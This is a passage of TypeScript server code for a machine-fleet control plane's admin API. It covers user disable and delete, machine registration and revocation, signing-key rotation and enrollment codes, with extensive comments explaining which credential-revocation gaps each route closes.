     * that burns codes permanently refusing to run — which is precisely the
     * scenario the comment below is written to close, half-open and unreachable.
     *
     * Synchronous throughout, like `delete`'s block: there is no `await` anywhere
     * between BEGIN and COMMIT, which is what makes a transaction safe on a
     * shared connection.
     */
    db.exec("BEGIN");
    let revoked = 0;
    let codesInvalidated = 0;
    let tokensInvalidated = 0;
    try {
      const changed = db
        .prepare("UPDATE users SET disabled_at = ? WHERE id = ? AND disabled_at IS NULL")
        .run(now, userId);
      if (changed.changes !== 1) {
        // Rolled back before answering, for `POST /v1/admin/users`'s reason: an
        // un-rolled-back BEGIN takes out the *next* writer on this connection,
        // which is a failure with no relationship to the request that caused it.
        db.exec("ROLLBACK");
        return jsonError(c, 404, "user_not_found", "no such user, or already disabled");
      }

      /*
       * Their sessions go too, and this is belt over braces: `callerAuth` reads
       * `disabled_at` live on every request, so a ban already lands on the next one.
       * Revoking here means the rows say what is true rather than leaving live-looking
       * sessions behind for an admin to read as "they are still signed in".
       */
      revoked = revokeAllSessions(db, userId, null, now);
      /*
       * And their unredeemed enrollment codes, which is **not** belt over braces —
       * it is the one credential a ban does not otherwise reach.
       *
       * Everything else that authenticates as this person goes through
       * `callerAuth`, which reads `disabled_at` live, so the ban lands on the next
       * request. `/v1/enroll` is registered *above* THE LINE: it has no caller, and
       * it asks only whether the code is unused and unexpired — never who minted
       * it, never whether they are still allowed here. So the exact hole
       * `burnUserCodes` was written for on the delete route was reachable through
       * the *reversible* remedy too. Offboard somebody at 10:05 holding a code they
       * minted at 10:00, and at 10:06 they POST it from anywhere with no
       * credential, receive the machine id and the fleet's public keys, and
       * `issueTunnelKey` retires the running daemon's tunnel key in the same call;
       * they dial the relay, `register` closes the legitimate tunnel as superseded,
       * and every grant-holder's traffic for that machine is spliced into their
       * process. A disabled account taking a machine off the relay and putting
       * itself on it is the sentence the delete route already refuses.
       *
       * Not undone by `enable`, for the reason that route already gives about
       * sessions: re-enabling restores the account, not the credentials that were
       * live while it was somebody's problem. Codes last an hour and minting
       * another is one request.
       *
       * Inside the transaction with the ban itself, because the two are one act:
       * see the BEGIN above for what a partial one costs, and why this route in
       * particular cannot recover from it.
       */
      codesInvalidated = burnUserCodes(db, userId, "user_disabled", now);
      /*
       * And the codes minted *for* them, which `created_by` cannot see.
       *
       * The paragraph above is about what this person minted. The other half is
       * `POST /v1/admin/machines/:id/enrollments` — `cpctl admin enroll` — where
       * an admin mints a code for somebody else's machine and hands it over:
       * `created_by` names the admin, so the sweep above walks straight past it,
       * and the whole scenario it just described plays out unchanged with the
       * code the person was *given* rather than one they made.
       *
       * Before the grants are dropped on the delete route, which is why it is a
       * `SELECT … FROM grants` and not a lookup through ownership: a grantee is
       * exactly who that route is usually driven for, and by the time the row is
       * gone there is nothing left to ask.
       */
      codesInvalidated += burnGranteeCodes(db, userId, "user_disabled", now);
      /*
       * And their live reset links, which is the same sentence one table over.
       *
       * `POST /v1/reset` also sits above THE LINE with no caller, and its claim
       * asks only whether a token is unused and unexpired. Without this, banning
       * somebody at 10:05 who asked for a reset at 10:00 leaves them a working
       * link: they set a new password, get a session, and `callerAuth` refuses it
       * on the next request — so the ban holds, but they have quietly taken the
       * account's password away from whoever inherits it. The route re-reads
       * `disabled_at` as well; two independent answers, because a sweep is the
       * half somebody forgets to call.
       */
      tokensInvalidated = burnEmailTokens(db, userId, "user_disabled", now);
      db.exec("COMMIT");
    } catch (error) {
      db.exec("ROLLBACK");
      throw error;
    }

    // Immediate for new tokens; tokens already issued live until they expire.
    return c.json({
      disabled: true,
      sessionsRevoked: revoked,
      emailLinksInvalidated: tokensInvalidated,
      // Reported for the same reason `delete` reports it: a code that was still
      // live is a machine identity somebody could have been about to redeem.
      enrollmentCodesInvalidated: codesInvalidated,
      outstandingTokensExpireWithinSeconds: tokenTtlSeconds,
    });
  });

  /**
   * The inverse, which never existed.
   *
   * Disabling was reachable and reversing it was not, so a mistaken ban meant
   * editing the database. That is a strange gap to leave beside a route whose
   * whole justification is that rows are never deleted.
   */
  app.post("/v1/admin/users/:id/enable", requireAdmin, (c) => {
    const changed = db
      .prepare("UPDATE users SET disabled_at = NULL WHERE id = ? AND disabled_at IS NOT NULL")
      .run(c.req.param("id"));
    if (changed.changes !== 1) return jsonError(c, 404, "user_not_found", "no such user, or not disabled");
    // Their old sessions stay revoked, and so do the enrollment codes `disable`
    // burned. Re-enabling restores the account, not the devices that were signed
    // into it — nor a machine identity somebody could have redeemed — while it
    // was somebody's problem.
    return c.json({ disabled: false });
  });

  /**
   * Delete a person, and everything that authenticates as them.
   *
   * **`schema.sql` used to say rows here are never deleted, and that is no longer
   * true.** The reason it gave was that a token already in the wild names this
   * subject and the audit trail should still say who that was — half of which
   * still holds, and neither half survives contact with the actual request. A
   * disabled account is a permanent row in a list that is read to answer "who can
   * use this", and somebody who left in March should not be four of its ten rows
   * for ever. Disable stays, and stays the **reversible** act; this is the one
   * that is not.
   *
   * What the old comment was right about is written down instead of enforced: an
   * `enrollment_codes.created_by` naming a user who no longer exists is a dangling
   * reference in the one audit table here. It is left dangling on purpose rather
   * than cascaded, because the row's job is to say what happened, and rewriting
   * history to keep a join valid is the opposite of an audit trail.
   *
   * **An unredeemed enrollment code is one of the things that authenticates as
   * them, and this route did not sweep it.** Sessions, origins, passwords, API
   * keys and grants all went; a code they minted a minute earlier survived,
   * because it lives in the table this route had decided not to rewrite. The two
   * are different acts: `burnUserCodes` marks the credential spent and touches
   * nothing that records who minted it, so the audit row survives naming a user
   * who is gone while the code it names stops working. Without it, a
   * just-deleted account redeems a held code at `/v1/enroll` — which sits above
   * THE LINE and asks only whether the code is unused and unexpired — receives
   * the machine id and the fleet's public keys, and `issueTunnelKey` retires the
   * legitimate daemon's key in the same call.
   *
   * **Machines they registered are revoked, and that reverses an earlier
   * decision here.** This used to drop `machine_owners` and leave the machines
   * registered and enrolled but ownerless, on the argument that revoking them
   * "takes a daemon somebody may still be running off the network as a side
   * effect of tidying a user list".
   *
   * What that argument missed is what ownerless *became*. A machine nobody owns
   * has no owner to have a machine limit, so it is outside the quota entirely —
   * and it is outside the ban check too, since both are facts about the owner.
   * Deleting a person was therefore the one act that could manufacture a live,
   * enrolled, fully reachable machine that no rule applies to. That is a hole in
   * a commercial control, not tidiness.
   *
   * So the invariant is now **no non-revoked machine is ownerless**, and this is
   * one of the two routes that could break it (the other is
   * `POST /v1/admin/machines`, where `ownerId` is required for the same reason).
   * Ownerless rows still *exist* and are still listed — every revoke produces
   * one, because `releaseOwner` has to free the label and the quota slot — but
   * every one of them is revoked, and a revoked machine is inert:
   * `resolveTunnelKey` refuses its dial and `authorize` refuses its requests.
   *
   * The old argument's true half survives as the price, stated rather than
   * dodged: a daemon somebody is still running does go off the network, and
   * getting it back means registering and enrolling it again on that host. That
   * is the correct trade only because the person it belonged to is *gone* —
   * which is why `disable`, the reversible remedy, does **not** do this. It
   * switches their machines off through `quota.ts`'s derived `ownerDisabled`
   * instead, and `enable` brings them back with nobody touching a host.
   */
  app.delete("/v1/admin/users/:id", requireAdmin, (c) => {
    const caller = c.get("caller");
    const userId = c.req.param("id");
    /*
     * The same refusal `disable` makes, for a stronger reason.
     *
     * Deleting yourself is not merely locking the fleet out of its own control
     * plane — it is doing so with no `enable` to undo it. It also makes the
     * "there is always at least one admin left" argument true by construction:
     * every caller here is an enabled admin, and cannot be the row being removed.
     */
    if (userId === caller.userId) {
      return jsonError(c, 409, "cannot_delete_self", "you cannot delete your own account");
    }
    const target = db.prepare("SELECT name FROM users WHERE id = ?").get(userId);
    if (!target) return jsonError(c, 404, "user_not_found", "no such user");

    const removedAt = Date.now();
    db.exec("BEGIN");
    let machinesRevoked = 0;
    let codesInvalidated = 0;
    try {
      // Origins first: they are keyed by session id, so removing the sessions
      // ahead of them would leave rows only the orphan sweep could find.
      db.prepare(
        "DELETE FROM user_session_origins WHERE session_id IN (SELECT id FROM user_sessions WHERE user_id = ?)",
      ).run(userId);
      db.prepare("DELETE FROM user_sessions WHERE user_id = ?").run(userId);
      db.prepare("DELETE FROM user_passwords WHERE user_id = ?").run(userId);
      db.prepare("DELETE FROM api_keys WHERE user_id = ?").run(userId);
      /*
       * Codes minted *for* their machines go **before** the grants that name
       * them, and that ordering is the whole reason this call is here rather
       * than beside `burnUserCodes` below.
       *
       * `burnGranteeCodes` asks `machine_id IN (SELECT machine_id FROM grants
       * WHERE user_id = ?)`. One statement later that subquery is empty, so the
       * sweep would match nothing and report zero — a burn that looks like it
       * ran. The code it exists for is the one `POST
       * /v1/admin/machines/:id/enrollments` hands a grantee, where `created_by`
       * names the admin and `burnUserCodes` cannot see it.
       */
      codesInvalidated = burnGranteeCodes(db, userId, "user_deleted", removedAt);
      db.prepare("DELETE FROM grants WHERE user_id = ?").run(userId);
      /*
       * The address and every link that could reach it.
       *
       * `PRAGMA foreign_keys = OFF`, so nothing cascades and every per-user table
       * is swept by hand here — which is why a new one is a change to *this*
       * block and not only to `schema.sql`. A live reset token outliving its
       * account would be a credential naming a user id that no longer exists;
       * `POST /v1/reset` reads the user before it acts and would answer
       * `token_unusable`, but leaving the row would be relying on a second check
       * to cover a first one that was simply not written.
       *
       * The verified address goes with it, which is also what frees that address
       * for somebody else under the partial unique index.
       */
      deleteEmailState(db, userId);
      db.prepare("DELETE FROM password_obligations WHERE user_id = ?").run(userId);
      /*
       * Their machine-limit override, for the reason the block above states:
       * nothing cascades, so a new per-user table is a change *here*.
       *
       * A row left behind is a limit that returns from the dead the day an id is
       * reused, and it is invisible in every list — `GET /v1/admin/users` reads
       * it by joining `users`, which no longer has a row to join.
       */
      db.prepare("DELETE FROM user_machine_limits WHERE user_id = ?").run(userId);
      // Synchronous, like everything else in this block, so it is safe inside the
      // transaction — there is no await anywhere between BEGIN and COMMIT, on a
      // connection every other writer shares.
      codesInvalidated += burnUserCodes(db, userId, "user_deleted", removedAt);
      /*
       * Their machines, revoked rather than released — see the docblock.
       *
       * The same three statements `POST /v1/machines/:id/revoke` runs, in the
       * same order and for the same reasons: mark it, burn its codes (a live one
       * is a full machine identity somebody could redeem), then drop the
       * ownership row so the label and the quota slot come back. Guarded on
       * `revoked_at IS NULL` so a machine they owned that was already revoked is
       * not re-stamped with a later time — its own revocation is the honest one.
       *
       * Inside the existing transaction, synchronous like everything else in
       * this block, so a partial delete cannot leave a machine marked revoked
       * with its codes still live.
       */
      for (const row of db
        .prepare("SELECT machine_id FROM machine_owners WHERE user_id = ?")
        .all(userId)) {
        const machineId = String(row["machine_id"]);
        const marked = Number(
          db
            .prepare("UPDATE machines SET revoked_at = ? WHERE id = ? AND revoked_at IS NULL")
            .run(removedAt, machineId).changes,
        );
        if (marked === 1) {
          codesInvalidated += burnMachineCodes(db, machineId, removedAt);
          machinesRevoked += 1;
        }
      }
      db.prepare("DELETE FROM machine_owners WHERE user_id = ?").run(userId);
      db.prepare("DELETE FROM users WHERE id = ?").run(userId);
      db.exec("COMMIT");
    } catch (error) {
      db.exec("ROLLBACK");
      throw error;
    }

    /*
     * One transaction, and the order inside it is the credentials first.
     *
     * A partial delete that removed the `users` row and left an `api_keys` row is
     * a credential belonging to nobody — `callerAuth` joins `users`, so it would
     * fail closed rather than authenticate, but it would also be invisible to
     * every list an admin can read. The transaction is what makes that
     * unreachable; the ordering only matters for the origins.
     */
    return c.json({
      deleted: true,
      name: String(target["name"]),
      /*
       * Said out loud because it is the one lasting side effect outside this
       * user's own rows, and the client repeats it to the person.
       *
       * **Renamed from `machinesReleased`, deliberately breaking the field.**
       * The act changed from "these machines now belong to nobody" to "these
       * machines are off the network", and a client still reading the old name
       * would print the old sentence about the new act — which is the one
       * outcome worse than a missing field. `cpctl` and the Users screen both
       * moved with it.
       */
      machinesRevoked,
      // The other side effect outside `users`, and worth its own number: a code
      // that was still live is a machine identity somebody could have been about
      // to redeem, so "there were two" is something an operator should read.
      enrollmentCodesInvalidated: codesInvalidated,
      outstandingTokensExpireWithinSeconds: tokenTtlSeconds,
    });
  });

  /**
   * Register a machine as an admin — now with an owner.
   *
   * **`ownerId` matters more than it looks.** `deploy/install.sh`'s daemon wizard
   * calls this with the fleet admin key when the control plane is on the same
   * host, and without an owner the result is a machine that enrolls, dials the
   * relay, holds a tunnel, and appears in no user's `GET /v1/machines` — because
   * nothing granted it to anybody. That was the *old* three-step dance
   * (`addmachine`, `enroll`, `grant`) with its third step still missing, which is
   * exactly the failure user-owned machines exists to remove.
   *
   * It grants nothing an admin did not already have: `POST /v1/admin/users/:id/keys`
   * lets an admin mint a credential for any user and act as them. Registering a
   * machine *for* somebody is the same authority, spelled honestly.
   *
   * **`ownerId` is required now, and that used to be optional.** The arm that
   * created a machine with no owner is gone: it was the second of the two ways
   * to manufacture a live, enrolled machine that no rule applies to — no owner
   * means no machine limit and no ban check, both being facts about the owner —
   * and it was reachable by forgetting one flag.
   *
   * The reason it was optional does not survive contact with that: it was "every
   * machine in an existing database already is ownerless, and the admin routes
   * have to keep being able to describe them". Describing them is `GET
   * /v1/admin/machines`, which is unchanged and still lists every one, with
   * `owner: null` on the row. Being able to *make more* of them was never what
   * that argument asked for.
   *
   * An ownerless machine is still reachable as a *state* — every revoke produces
   * one, because `releaseOwner` has to give the label and the quota slot back —
   * but every one of those is revoked and therefore inert. The invariant this
   * route now helps hold is the narrow one: **no non-revoked machine is
   * ownerless.**
   */
  app.post("/v1/admin/machines", requireAdmin, async (c) => {
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");
    const name = body["name"];
    if (typeof name !== "string" || name.trim().length === 0 || name.length > 200) {
      return jsonError(c, 400, "bad_request", "name is required and must be at most 200 characters");
    }
    const ownerId = body["ownerId"];
    // Required, and the refusal names the remedy: an admin who forgot the flag
    // is one word away, and the alternative used to be a machine nobody owns.
    if (typeof ownerId !== "string" || ownerId.length === 0) {
      return jsonError(
        c,
        400,
        "bad_request",
        "ownerId is required — a machine with no owner is outside the machine limit and outside the ban check",
      );
    }

    {
      if (!db.prepare("SELECT id FROM users WHERE id = ?").get(ownerId)) {
        return jsonError(c, 404, "user_not_found", "no such user");
      }
      const named = readLabel(name);
      if (!named.ok) return jsonError(c, 400, "bad_request", named.message);
      /*
       * The same wider clash check every other creation path makes, and this was
       * the one *creation* path without it. Renaming an existing row asks the
       * identical question from the other side and had no guard either — see
       * `nameVisibleToGrantees` at the PATCH below, where the audience has to be
       * enumerated because `machines.name` is not one person's name for it.
       *
       * `createOwnedMachine` leans on the unique index on `(user_id, label)`,
       * which is deliberately narrow: it says nothing about a machine somebody
       * *shared* with this person, or a legacy row they see under `machines.name`.
       * Those are exactly what an admin registering a machine *for* somebody
       * collides with — and this is the route `deploy/install.sh`'s daemon wizard
       * calls. Measured: ada holds a grant on an ownerless `buildbox`; her own
       * `POST /v1/machines {name:"buildbox"}` is correctly refused 409, while
       * `POST /v1/admin/machines {name:"buildbox", ownerId: ada}` answered 201 and
       * left her list drawing two indistinguishable `buildbox` rows, with
       * `POST /v1/tokens {machine:"buildbox"}` silently resolving to the new empty
       * one — the shadowing `nameVisibleTo` exists to prevent, reached through the
       * admin door. Case-folded here and BINARY in the index, so `LAPTOP` beside
       * `laptop` is the same failure and only this check sees it.
       */
      if (nameVisibleTo(db, ownerId, named.label)) {
        return jsonError(c, 409, "machine_exists", "that user can already see a machine with that name");
      }
      const quota = effectiveLimit(db, ownerId);
      const created = createOwnedMachine(db, ownerId, named.label, ALL_SCOPES, quota.limit);
      if ("error" in created) {
        if (created.error === "too_many") {
          // Naming the remedy rather than only the refusal, because the person
          // reading this is the one who can apply it.
          return jsonError(
            c,
            409,
            "machine_limit",
            `that user's machine limit is ${quota.limit} and they own ${machineCount(db, ownerId)} — ` +
              "raise their limit first",
          );
        }
        return jsonError(c, 409, "machine_exists", "that user already has a machine with that name");
      }
      return c.json(adminMachine({ id: created.id, name: created.name, enrolled_at: null, revoked_at: null }), 201);
    }
  });

  /**
   * Rename a machine.
   *
   * This route used to carry the routing policy as well — `baseUrl`, which was
   * the whole of it: a machine that had one was probed directly first, and one
   * that did not was reachable only through the relay. There is no such choice
   * now. Every user reaches every machine through this service, so there is
   * nothing per machine to decide and no address to record.
   *
   * The route survives its original occupant because renaming still has the same
   * problem that justified it: without a PATCH the only lever is set at
   * `POST /v1/admin/machines` and never again, so changing it means deleting the
   * machine — losing its enrollment, its tunnel credential and every grant on
   * it — or editing SQLite by hand.
   *
   * **Two clash checks, because the global one cannot see the collision that
   * matters.** `machines.name` is `UNIQUE`, so the first is what turns a
   * constraint violation into a 409 — but for an *owned* machine that column is
   * `qualifiedName(label, id)`, never the bare word, so a global uniqueness test
   * is blind to the shadowing `nameVisibleTo` exists for. The shape, driven in
   * `relaycheck`: ada owns a machine labelled `laptop` and holds a grant on an
   * ownerless legacy machine, and `cpctl admin setmachine <legacy> --name
   * laptop` — the rename verb this repository documents — passed the unique
   * check, leaving her list drawing two indistinguishable `laptop` rows with
   * `POST /v1/tokens {machine:"laptop"}` silently resolving to her own and the
   * legacy machine unreachable by name. `nameVisibleToGrantees` is that guard,
   * on the fifth and last door that gives a machine a name.
   *
   * **Last that *names* one, not last that makes a name visible** — `PUT
   * /v1/admin/grants` reaches the identical two-indistinguishable-rows state by
   * handing somebody a machine that is already called something, and it checks
   * nothing. Knowingly open; the reasoning is at `nameVisibleToGrantees`.
   */
  app.patch("/v1/admin/machines/:id", requireAdmin, async (c) => {
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");

    const machineId = c.req.param("id");
    const machine = db
      .prepare("SELECT id, name, enrolled_at, revoked_at FROM machines WHERE id = ? OR name = ?")
      .get(machineId, machineId);
    if (!machine) return jsonError(c, 404, "machine_not_found", "no such machine");
    if (machine["revoked_at"] !== null) {
      return jsonError(c, 403, "machine_revoked", "this machine has been revoked");
    }

    let name = String(machine["name"]);
    if ("name" in body) {
      const raw = body["name"];
      if (typeof raw !== "string" || raw.trim().length === 0 || raw.length > 200) {
        return jsonError(c, 400, "bad_request", "name must be a non-empty string of at most 200 characters");
      }
      name = raw.trim();
      const clash = db.prepare("SELECT id FROM machines WHERE name = ? AND id != ?").get(name, String(machine["id"]));
      if (clash) return jsonError(c, 409, "machine_exists", "a machine with that name already exists");
      // The wider one. Asked of the grant list rather than of one caller, since
      // this column is what the machine is called to everybody who does not own
      // it — see `nameVisibleToGrantees`.
      if (nameVisibleToGrantees(db, String(machine["id"]), name)) {
        return jsonError(c, 409, "machine_exists", "somebody who can reach this machine already sees one with that name");
      }
    }

    db.prepare("UPDATE machines SET name = ? WHERE id = ?").run(name, String(machine["id"]));

    /*
     * Deliberately not touched: `enrolled_at`, the tunnel credential, and every
     * grant. Renaming a machine is not re-enrolling it — the daemon already
     * holds the public key it needs and must not be made to fetch anything
     * again, which is the one property this whole design buys.
     */
    return c.json(
      adminMachine({
        id: String(machine["id"]),
        name,
        enrolled_at: machine["enrolled_at"],
        revoked_at: machine["revoked_at"],
      }),
    );
  });

  app.get("/v1/admin/machines", requireAdmin, (c) => {
    // Named columns rather than `SELECT *`: the projection below reads five of
    // them, and a star means a schema addition silently starts crossing the wire.
    const rows = db
      .prepare("SELECT id, name, enrolled_at, revoked_at FROM machines ORDER BY created_at ASC")
      .all();
    /*
     * The over-limit set and the owner map, both built once.
     *
     * `adminMachine` asks per row, which is right for the routes that return one
     * machine and is N+1 here — this list is the whole fleet.
     */
    const overLimit = overLimitMachineIds(db);
    const owners = new Map<string, { userId: string; label: string }>();
    for (const row of db.prepare("SELECT machine_id, user_id, label FROM machine_owners").all()) {
      owners.set(String(row["machine_id"]), { userId: String(row["user_id"]), label: String(row["label"]) });
    }
    return c.json({
      machines: rows.map((row) =>
        adminMachineProjection(
          row,
          relayUrlFor,
          relayOnline,
          (id) => overLimit.has(id),
          (id) => owners.get(id) ?? null,
          lastSeenAt,
        ),
      ),
    });
  });

  /**
   * What the relay is actually carrying.
   *
   * `requestsProxied` is the reason this route exists. "Traffic does not touch
   * the relay when the client can reach the daemon directly" is otherwise an
   * assertion nobody can check; with a counter it is a measurement — run a direct
   * client, watch it not move.
   */
  app.get("/v1/admin/relay", requireAdmin, (c) => {
    const tunnels = relay === null ? [] : relay.stats();
    /*
     * Relay ids that are holding tunnels and are not in the routing map.
     *
     * The map is keyed on a name the *relay* chooses, and nothing cross-checks
     * that an id in one exists in the other — a missing entry degrades to the
     * shared URL and keeps working, one request in N slowly, with no error
     * anywhere. That is the change's own stated failure mode, and until this
     * field it was undetectable by any shipped means short of opening the
     * database.
     *
     * Empty when no map is configured, deliberately: that is the single-relay
     * shape, where falling back to the one URL is not a fallback but the answer.
     */
    const unmapped =
      relayUrls === null
        ? []
        : [...new Set(tunnels.map((tunnel) => tunnel.relayId))].filter((id) => !Object.hasOwn(relayUrls, id)).sort();
    return c.json({
      enabled: relay !== null,
      url: relayUrl,
      relayUrls,
      unmapped,
      tunnels,
    });
  });

  /* ---------------------------------------------------------------- *
   * What is actually out there
   *
   * The question a staged rollout cannot be planned without, and until this
   * route there was no way to ask it: nothing recorded what any daemon was
   * running. That absence is what made a protocol change a flag day — with no
   * inventory, "has everybody updated?" has no answer, so the only safe move is
   * to assume nobody has and never change anything, and the only *available*
   * move is to change it and find out from the complaints.
   *
   * The numbers come off the tunnel handshake (`recordDaemonBuild`) rather than
   * from asking a daemon anything, which is what keeps Q1.9 intact: the daemon
   * makes exactly one control-plane request ever, at enrollment, and this is not
   * a second one. It reports on its way in.
   *
   * Offline machines are included on purpose, and are the whole point. The
   * machine that decides whether a floor can be raised is the one that has been
   * dark for a month on a version nothing else still speaks — a report of what is
   * *connected* would omit exactly it.
   * ---------------------------------------------------------------- */
  app.get("/v1/admin/fleet", requireAdmin, (c) => {
    const rows = db
      .prepare(
        `SELECT m.id, m.name, m.daemon_version, m.daemon_protocol, m.daemon_agents, m.daemon_seen_at, m.revoked_at,
                mo.label AS label
           FROM machines m
           LEFT JOIN machine_owners mo ON mo.machine_id = m.id
          ORDER BY m.name`,
      )
      .all();

    const machines = rows.map((row) => ({
      id: String(row["id"]),
      name: String(row["name"]),
      label: typeof row["label"] === "string" ? row["label"] : null,
      revoked: row["revoked_at"] !== null,
      // `null` reads as "has not dialled since daemons began reporting", which is
      // the honest answer for a machine that predates the header and for one that
      // has simply not been on. Nothing distinguishes them and nothing needs to.
      version: typeof row["daemon_version"] === "string" ? row["daemon_version"] : null,
      protocol: typeof row["daemon_protocol"] === "number" ? row["daemon_protocol"] : null,
      /*
       * Which build of each coding-agent CLI the machine would launch, as of the
       * same dial — harness id → version, `null` for a binary that would not say.
       * `null` for the whole field where the daemon predates `AGENT_CLIS_HEADER`,
       * had no CLI to name, or sent something the grammar refused; the same "did
       * not say" as `version`, and as fresh as the same handshake. The column
       * holds `readAgentClisHeader`'s canonical spelling, so this parse cannot
       * fail on anything the relay wrote — the guard is for a row edited by hand.
       */
      agents: typeof row["daemon_agents"] === "string" ? parseAgentClis(row["daemon_agents"]) : null,
      seenAt: typeof row["daemon_seen_at"] === "number" ? row["daemon_seen_at"] : null,
    }));

    /*
     * The summary is the part somebody acts on: how many machines sit on each
     * protocol version, which is the number that decides whether the floor can
     * move. Counted over every machine rather than every *live* one, with
     * `unknown` carrying the ones that have never reported.
     */
    const byProtocol: Record<string, number> = {};
    for (const machine of machines) {
      if (machine.revoked) continue;
      const key = machine.protocol === null ? "unknown" : String(machine.protocol);
      byProtocol[key] = (byProtocol[key] ?? 0) + 1;
    }

    return c.json({
      relay: { protocol: RELAY_PROTOCOL_VERSION, oldestAccepted: RELAY_PROTOCOL_MIN_VERSION },
      controlPlane: { version: VERSION },
      byProtocol,
      machines,
    });
  });

  /* ---------------------------------------------------------------- *
   * The fleet's signing keys
   *
   * `schema.sql` has described an overlapping rotation since the table existed —
   * plural, `retired_at` "so a rotation can overlap: both keys are published
   * while daemons re-enroll, then the old one is retired" — and there was no code
   * anywhere that could mint a second one or retire the first. Two readers of
   * `retired_at`, no writer. The same shape `api_keys.revoked_at` is named for,
   * on the key that mints every token in the fleet.
   *
   * Nothing else had to change for this to work, which is the sign it was
   * always meant to: `activeSigningKeys` orders newest-first and every signing
   * site calls it per request, `/v1/jwks` and `/v1/enroll` publish the whole
   * active set, and `keyIdFor` is deterministic so a daemon recognises a key it
   * already holds rather than treating it as new.
   * ---------------------------------------------------------------- */

  app.get("/v1/admin/signing-keys", requireAdmin, (c) =>
    // The public half is on `/v1/jwks` for anybody; this is the *inventory* — what
    // exists, when, and what is retired — which is what an admin needs to decide
    // what to retire. No key material either way.
    c.json({ keys: signingKeyRows(db) }),
  );

  /**
   * Rotate: mint a key and make it the one that signs.
   *
   * The old key stays **active**, and that is the whole design rather than a
   * step somebody forgot. A daemon captures the key set once at enrollment and
   * never asks again, so retiring the old key here would mean every daemon in
   * the fleet verifying tokens against a key that no longer signs them —
   * i.e. the entire fleet unreachable until each host is re-enrolled by hand.
   * Publishing both is what makes the overlap survivable; retiring is a separate,
   * later act, once the daemons have re-enrolled.
   */
  app.post("/v1/admin/signing-keys", requireAdmin, (c) => {
    const minted = mintSigningKey(db);
    return c.json({ kid: minted.kid, active: signingKeyRows(db).filter((row) => row.retiredAt === null).length }, 201);
  });

  /**
   * Retire one, and refuse to retire the last.
   *
   * `409 last_active` rather than a 400: the request is well formed and the state
   * is what refuses. A control plane with no active key cannot sign a token for
   * any machine **and cannot mint a replacement**, because `ensureSigningKey`
   * runs at startup and nothing here restarts itself — so the fleet would go dark
   * on one request, with the way back being a shell inside a `read_only`
   * container.
   */
  app.delete("/v1/admin/signing-keys/:kid", requireAdmin, (c) => {
    const result = retireSigningKey(db, c.req.param("kid"));
    if (result.ok) return c.json({ retired: true });
    if (result.reason === "not_found") {
      return jsonError(c, 404, "key_not_found", "no such active signing key");
    }
    return jsonError(
      c,
      409,
      "last_active",
      "this is the only active signing key; mint another before retiring it",
    );
  });

  /**
   * Mint an enrollment code. The same route serves first enrollment and
   * re-enrollment — re-enrolling is just redeeming a newer code, which is what
   * makes it also the key-rotation path.
   */
  app.post("/v1/admin/machines/:id/enrollments", requireAdmin, (c) => {
    const machineId = c.req.param("id");
    const machine = db.prepare("SELECT id, revoked_at FROM machines WHERE id = ?").get(machineId);
    if (!machine) return jsonError(c, 404, "machine_not_found", "no such machine");
    if (machine["revoked_at"] !== null) {
      return jsonError(c, 403, "machine_revoked", "this machine has been revoked");
    }

    ensureSigningKey(db);

    // The same minter the owner's route uses, so "one live code per machine"
    // cannot be true on one path and false on the other.
    const minted = mintEnrollmentCode(db, machineId, c.get("caller").userId, ENROLLMENT_CODE_TTL_MS);

    // Shown once. Only the hash was stored, so this cannot be recovered later.
    return c.json(
      { code: minted.code, machineId, expiresAt: minted.expiresAt, controlPlaneUrl: installOrigin(c, trustedProxyHops) },
      201,
    );
  });

  /**
   * The admin's revoke, and it is the owner's route's twin — same three writes,
   * same transaction, same `burnMachineCodes`. See `POST /v1/machines/:id/revoke`
   * for why the ownership row has to go with the other two.
   *
   * `releaseOwner` here is a no-op for every machine registered before ownership
   * existed, which is most of what this route is aimed at, and is exactly the
   * point for the ones it is not.
   */
  app.post("/v1/admin/machines/:id/revoke", requireAdmin, (c) => {
    const machineId = c.req.param("id");
    const now = Date.now();
    let changed = 0;
    let burned = 0;
    // No `return` between BEGIN and COMMIT, and no await: this connection is
    // shared and synchronous, so either one leaves a transaction open under the
    // next writer.
    db.exec("BEGIN");
    try {
      changed = Number(
        db
          .prepare("UPDATE machines SET revoked_at = ? WHERE id = ? AND revoked_at IS NULL")
          .run(now, machineId).changes,
      );
      if (changed === 1) {
        burned = burnMachineCodes(db, machineId, now);
        releaseOwner(db, machineId);
      }
      db.exec("COMMIT");
    } catch (error) {
      db.exec("ROLLBACK");
      throw error;
    }
    if (changed !== 1) {
      return jsonError(c, 404, "machine_not_found", "no such machine, or already revoked");
    }

    return c.json({
      revoked: true,
      enrollmentCodesInvalidated: burned,
      // Said plainly, because it is the whole revocation story: the daemon is
      // never asked anything, so an already-issued token dies of old age.
      outstandingTokensExpireWithinSeconds: tokenTtlSeconds,
    });
  });

  /**
   * Give an existing machine an owner — **the inverse of `machinesReleased`**.
   *
   * `INSERT INTO machine_owners` happened in exactly one place,
   * `createOwnedMachine`, which always mints a fresh id. So *becoming* an owner
   * was inseparable from *creating* a machine and ownerless was a one-way state:
   * `POST /v1/admin/machines {ownerId}` reads like an adoption and creates
   * instead, and after `DELETE /v1/admin/users/:id` reports `machinesReleased`
   * those machines could never have an owner again — rename, re-enroll and revoke
   * all answer 404 for the life of the row, because each resolves through
   * `ownerOf`. A person leaving the fleet therefore stranded their hardware, and
   * the only remedy was editing SQLite.
   *
   * **The grant is written with the ownership row, not left to a second act.**
   * That is the same lesson `createOwnedMachine` records: `GET /v1/machines`
   * joins `grants`, so an owner with no grant owns a machine that appears in no
   * list, which is the exact failure user-owned machines exists to remove. Every
   * scope, for `createOwnedMachine`'s reason — without `machine:admin` the owner
   * cannot remove a workspace on their own hardware.
   *
   * The **previous** owner's grant is deliberately left alone. Ownership and
   * access are different things here: two people may hold a grant on one machine,
   * and taking somebody's access away is `DELETE /v1/admin/grants`, which is its
   * own verb with its own audit story.
   */
  app.put("/v1/admin/machines/:id/owner", requireAdmin, async (c) => {
    const body = await readJsonObject(c);
    if (!body) return jsonError(c, 400, "bad_request", "expected a JSON object body");
    const machineId = c.req.param("id");
    const userId = body["userId"];
    if (typeof userId !== "string" || userId.length === 0) {
      return jsonError(c, 400, "bad_request", "userId is required");
    }
    const named = readLabel(body["label"]);
    if (!named.ok) return jsonError(c, 400, "bad_request", named.message);
    const label = named.label;

    const machine = db.prepare("SELECT id, revoked_at FROM machines WHERE id = ?").get(machineId);
